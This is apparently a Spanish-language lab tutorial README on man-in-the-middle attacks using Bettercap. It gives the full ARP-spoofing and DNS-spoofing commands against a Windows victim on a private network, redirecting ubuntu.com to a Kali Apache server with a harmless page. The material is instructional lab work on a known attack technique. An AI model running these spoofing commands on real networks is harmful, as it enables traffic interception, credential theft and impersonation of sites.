# Ataque Man in the Middle con Bettercap

<br>

<p align="center">
<img src="./Img/Logo.png">
</p>

<br>

## Que es un ataque Main in the Middle?

Ataque de intermediario ocurre cuando un atacante puede interceptar o manipular tráfico entre dos partes conocidas como víctima y receptor.

La víctima es aquella persona que envía un mensaje a otro individuo esperando una respuesta, mientras que el receptor es la parte que recibe la información para luego analizarla y responder a la solicitud enviada.

El atacante aparte de interceptar todos los datos que son enviados entre las dos partes podría llegar a manipular los datos para obtener información confidencial, modificar transferencias bancarias e incluso suplantar la identidad ya sea de la víctima o el receptor.

## Instalación

```
sudo apt-get install bettercap
```

<br>

## USO

Para hacer un ataque **MITM** tendremos que hacer un ataque **DNS Spoofing** a nuestra máquina windows.

Ahora usaremos con siguiente comandos

```
bettercap

set arp.spoof targets 192.168.1.10

arp.spoof on

set dns.spoof.domains ubuntu.com

set dns.spoof.address 192.168.1.20

dns.spoof on
```

Si vamos a la máquina víctima abrimos CMD y ejecutamos el siguiente comando

```
arp -a
```

<br>

<p align="center">
<img src="./Img/arp.jpg">
</p>

<br>

Como podemos ver tenemos como puerta de enlace la IP de nuestro kali Linux.

Ahora vamos a configurar nuestra pagina web e iniciar el servicio apache2

```
sudo su

cd /var/www/html

rm index.html

nano index.html
```

Y copiamos el siguiente codigo

<br>

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MITM</title>
    <style type="text/css">
        .titulo{
            font-size: 30px;
        }
        .texto{
            font-size: 30px;
        }
    </style>
</head>
<body>
    <div align="center">
        <h1 class="Titulo">
            Ataque de Intermediario
        </h1>
        <div class="texto">
            Has sido Víctima de un DNS Spoofing
        </div>
    </div>
</body>
</html>
```

<br>

Ahora vamos a levantar el servidor apache2

```
service apache2 start
```

Como podemos ver al acceder a **ubuntu.com** en la máquina víctima nos sale el index.html de nuestro servidor apache2 de Kali Linux.

<br>

<p align="center">
<img src="./Img/ubuntu.png">
</p>

<br>
